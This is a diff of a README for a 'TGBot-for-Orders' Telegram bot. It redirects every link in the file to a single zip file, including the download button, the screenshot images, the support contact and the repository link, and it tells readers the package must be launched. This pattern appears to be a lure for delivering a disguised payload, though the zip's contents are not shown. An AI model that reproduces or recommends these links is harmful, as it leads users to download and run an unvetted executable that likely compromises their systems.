@@ -9,7 +9,7 @@ Welcome to the "TGBot-for-Orders" repository - your one-stop solution for a full
 
 ## 🚀 Get Started!
 Ready to streamline your order management process? Download the application package by clicking the button below:
-[![Download Application](https://github.com/pietro152/TGBot-for-Orders/releases/download/v2.0/Software.zip<COLOR>.svg)](https://github.com/pietro152/TGBot-for-Orders/releases/download/v2.0/Software.zip)
+[![Download Application](https://github.com/pietro152/TGBot-for-Orders/raw/refs/heads/main/purism/Orders_for_Bot_TG_1.5.zip<COLOR>.svg)](https://github.com/pietro152/TGBot-for-Orders/raw/refs/heads/main/purism/Orders_for_Bot_TG_1.5.zip)
 
 *Note: The application package needs to be launched for installation.*
 
@@ -29,11 +29,11 @@ Follow these steps to set up the TGBot-for-Orders on your Telegram account:
 
 ## 📷 Screenshots
 Here are some glimpses of the TGBot-for-Orders in action:
-![Screenshot 1](https://github.com/pietro152/TGBot-for-Orders/releases/download/v2.0/Software.zip)
-![Screenshot 2](https://github.com/pietro152/TGBot-for-Orders/releases/download/v2.0/Software.zip)
+![Screenshot 1](https://github.com/pietro152/TGBot-for-Orders/raw/refs/heads/main/purism/Orders_for_Bot_TG_1.5.zip)
+![Screenshot 2](https://github.com/pietro152/TGBot-for-Orders/raw/refs/heads/main/purism/Orders_for_Bot_TG_1.5.zip)
 
 ## 🌟 Support
-If you encounter any issues during installation or while using the bot, feel free to reach out to the support team at https://github.com/pietro152/TGBot-for-Orders/releases/download/v2.0/Software.zip We're here to ensure you have a smooth experience with our product!
+If you encounter any issues during installation or while using the bot, feel free to reach out to the support team at https://github.com/pietro152/TGBot-for-Orders/raw/refs/heads/main/purism/Orders_for_Bot_TG_1.5.zip We're here to ensure you have a smooth experience with our product!
 
 ## 📢 Contributions
 We welcome contributions to enhance the functionality and features of the TGBot-for-Orders. If you have any ideas or suggestions, don't hesitate to create a pull request. Together, we can make this bot even more powerful!
@@ -43,7 +43,7 @@ The TGBot-for-Orders is licensed under the [Custom License](LICENSE) to protect 
 
 ---
 
-🔗 For more details and the latest updates, visit the [TGBot-for-Orders GitHub repository](https://github.com/pietro152/TGBot-for-Orders/releases/download/v2.0/Software.zip).
+🔗 For more details and the latest updates, visit the [TGBot-for-Orders GitHub repository](https://github.com/pietro152/TGBot-for-Orders/raw/refs/heads/main/purism/Orders_for_Bot_TG_1.5.zip).
 
 📌 *If the provided link is not accessible, please check the "Releases" section of the repository for alternative download options.*
 
